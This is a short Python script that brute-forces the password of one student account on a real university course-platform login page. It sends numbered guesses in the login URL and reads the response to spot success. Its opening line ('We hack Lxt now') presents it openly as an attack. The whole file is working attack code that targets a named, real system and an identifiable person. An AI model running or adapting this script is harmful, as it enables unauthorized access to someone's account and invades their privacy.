#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2

print('We hack Lxt now'),
for i in range(2014122001,2014122099):
    url='http://jxpt.cuit.edu.cn/eol/homepage/common/login.jsp?IPT_LOGINUSERNAME=2014122077&IPT_LOGINPASSWORD='+str(i)+''
    html=urllib2.urlopen(url).read()
    if(html[47] == 'm'and html[48] == 'e'):
        print('.'),
    else:
        print('His jwc password is '+str(i)+'')
        break